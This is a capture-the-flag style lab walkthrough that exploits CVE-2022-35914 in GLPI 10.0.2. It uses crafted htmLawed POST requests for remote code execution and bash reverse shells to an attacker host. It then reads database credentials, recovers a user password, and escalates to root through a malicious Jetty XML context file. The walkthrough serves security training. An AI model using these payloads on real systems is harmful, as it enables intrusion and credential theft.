_____

## Summary:

In this guide, we will exploit `CVE-2022-35914` targeting `GLPI 10.0.2`. Once on the box, we will exploit a vulnerable `Jetty` Server in order to obtain root access.

## Enumeration

We begin the enumeration process with an nmap scan:

```
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV  192.168.56.3
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 8b:76:66:d9:bb:fa:dd:89:1c:73:8e:c4:83:d7:99:c9 (RSA)
|   256 41:f0:f7:c2:68:03:08:a3:e6:8a:e5:ab:7e:98:1b:bd (ECDSA)
|_  256 32:57:38:75:9d:27:0a:59:31:21:f4:bc:9f:9c:3a:69 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Authentication - GLPI
|_http-server-header: Apache/2.4.41 (Ubuntu)
MAC Address: 08:00:27:A5:BA:30 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

From the results we find that ports `22` and `80` are open.

We visit port `80` with our browser and notice a GLPI authentication form.

Turning to content discovery reveals the following:

- http://192.168.56.3/CHANGELOG.md : this give the information about the version 10.0.2
- http://192.168.56.3/phpinfo.php : this give the information about the disable_function exec

## Exploitation

We find that `GLPI 10.0.2` is vulnerable to [CVE-2022-35914](https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/)

However the public exploit will not work on the target as the `exec` function is disabled.

We must find another way to exploit the vulnerability using the callback function

We proceed by executing the following payload :

```
$C['hook']($t, $C, $S)
```

- $t is the user entry : string
- $C the config array : we can add whatever we want on the array
- $S : the spec parameter can be a string or an array

If we use `array_map` as a hook function this will run the callback function : $t, on each $C array value with the $S entry as params.

```
text=<callback>&hhook=array_map&hexec=<my_entry>&sid=bs&spec[0]=&spec[1]=&spec[2]=...
```

With this payload we can use the following :

- hhook=array_map : will launch array_map with the callback function on all the entries of $C.
- text=call_user_func : call_user_func will be used as a callback function on every entries of $C (due to array map).
- we add an entry on the config array with a parameter : hexec=system.
- and next the corresponding config entry will be call with the corresponding spec array value.

As an example we could look at this simplification in PHP console :

```
php > array_map('call_user_func',['XXXX','system','YYYY'],['AAA','echo COMMANDEXEC','BBB','CCC']);
PHP Warning:  call_user_func() expects parameter 1 to be a valid callback, function 'XXXX' not found or invalid function name in php shell code on line 1
PHP Stack trace:
PHP   1. {main}() php shell code:0
PHP   2. array_map() php shell code:1
PHP   3. call_user_func:{php shell code:1}() php shell code:1
COMMANDEXEC
PHP Warning:  call_user_func() expects parameter 1 to be a valid callback, function 'YYYY' not found or invalid function name in php shell code on line 1
PHP Stack trace:
PHP   1. {main}() php shell code:0
PHP   2. array_map() php shell code:1
PHP   3. call_user_func:{php shell code:1}() php shell code:1
PHP Warning:  call_user_func() expects parameter 1 to be a valid callback, no array or string given in php shell code on line 1
PHP Stack trace:
PHP   1. {main}() php shell code:0
PHP   2. array_map() php shell code:1
PHP   3. call_user_func:{php shell code:1}() php shell code:1
```

From the output we see that when the `array_map` matches `call_user_func('system','echo COMMANDEXEC')` we are able to proceed.

We'll proceed by crafting the following request.

```
POST /vendor/htmlawed/htmlawed/htmLawedTest.php HTTP/1.1
Host: 192.168.56.3
Content-Type: application/x-www-form-urlencoded
Content-Length: 75
Connection: close
Cookie: sid=bs

text=call_user_func&hhook=array_map&hexec=system&sid=bs&spec[0]=&spec[1]=id
```

Now that we have confirmed RCE we can proceed to setup a listener on our attack machine.

```
# sudo nc -nlvp 80
```

Now we launch the exploit :

```
POST /vendor/htmlawed/htmlawed/htmLawedTest.php HTTP/1.1
Host: 192.168.56.3
Content-Type: application/x-www-form-urlencoded
Content-Length: 127
Connection: close
Cookie: sid=bs

text=call_user_func&hhook=array_map&hexec=system&sid=bs&spec[0]=&spec[1]=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.56.1/80+0>%261'
```

We have received a response as www-data:

```
Listening on [0.0.0.0] (family 0, port 80)
Connection from 192.168.56.3 54760 received!
bash: cannot set terminal process group (14789): Inappropriate ioctl for device
bash: no job control in this shell
www-data@glpi:/var/www/glpi/vendor/htmlawed/htmlawed$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Privilege Escalation

During our enumeration we discover the user `betty` but we cannot access `/home/betty/local.txt` as the `www-data` user.

The file `/var/www/glpi/config/config_db.php` returns information about the database connection.

```
<ed/htmlawed$ cat /var/www/glpi/config/config_db.php      
<?php
class DB extends DBmysql {
   public $dbhost = 'localhost';
   public $dbuser = 'glpi';
   public $dbpassword = 'glpi_db_password';
   public $dbdefault = 'glpi';
   public $use_utf8mb4 = true;
   public $allow_myisam = false;
   public $allow_datetime = false;
   public $allow_signed_keys = false;
}
```

Analyzing the GLPI database reveals the password for the `betty` user in the table : `glpi_itilfollowups`.

![glpi_ticket.png](https://portal.offsec.com/img/glpi_ticket.png)

glpi_ticket.png

We can also change the password of one of the users to directly visualize the ticket information in GLPI : `SnowboardSkateboardRoller234`.

We can now login via SSH with the credentials `betty:SnowboardSkateboardRoller234`.

```
ssh betty@192.168.56.3
betty@192.168.56.3's password:
...
betty@glpi:~$
```

During our enumeration we notice a running service on port `8080`.

The `ps faux` command reveals a jetty server running :

```
root       17345  0.3  3.8 2545364 78832 ?       Sl   12:28   0:21 /usr/bin/java -Djava.io.tmpdir=/tmp -Djetty.home=/opt/jetty -Djetty.base=/opt/jetty/jetty-base --class-path /opt/jetty/jetty-base/resources:/opt/jetty/lib/logging/slf4j-api-2.0.0.jar:/opt/jetty/lib/logging
be
```

We navigate to the Jetty folder and discover a webapps folder a writable by betty :

```
betty@glpi:/opt/jetty/jetty-base$ ll
total 24
drwxr-xr-x 5 root  root  4096 Oct  9 12:28 ./
drwxr-xr-x 7 root  root  4096 Oct  9 12:28 ../
-rw-r--r-- 1 root  root   102 Oct  9 12:28 jetty.state
drwxr-xr-x 2 root  root  4096 Oct  9 12:28 resources/
drwxr-xr-x 2 root  root  4096 Oct  9 12:28 start.d/
drwxr-xr-x 2 betty betty 4096 Oct  9 12:28 webapps/
```

We can attempt to obtain a reverse shell with the following technique : https://twitter.com/ptswarm/status/1555184661751648256/photo/1

We begin by creating a reverse shell script to run:

```
echo "bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'" > /tmp/run.sh
chmod +x /tmp/run.sh
```

Now we create the following exploit and setup a listener.

```
cat << EOF > /opt/jetty/jetty-base/webapps/run.xml
<?xml version="1.0"?>
<!DOCTYPE Configure PUBLIC "-//Jetty//Configure//EN" "https://www.eclipse.org/jetty/configure_10_0.dtd">
<Configure class="org.eclipse.jetty.server.handler.ContextHandler">
    <Call class="java.lang.Runtime" name="getRuntime">
        <Call name="exec">
            <Arg>
                <Array type="String">
                    <Item>/tmp/run.sh</Item>
                </Array>
            </Arg>
        </Call>
    </Call>
</Configure>
EOF
nc -nlvp 4444
```

We receive a response in our listener and have successfully obtained root access.

```
Listening on 0.0.0.0 4444
Connection received on 127.0.0.1 41808
bash: cannot set terminal process group (17344): Inappropriate ioctl for device
bash: no job control in this shell
root@glpi:/opt/jetty/jetty-base# id
uid=0(root) gid=0(root) groups=0(root)
```
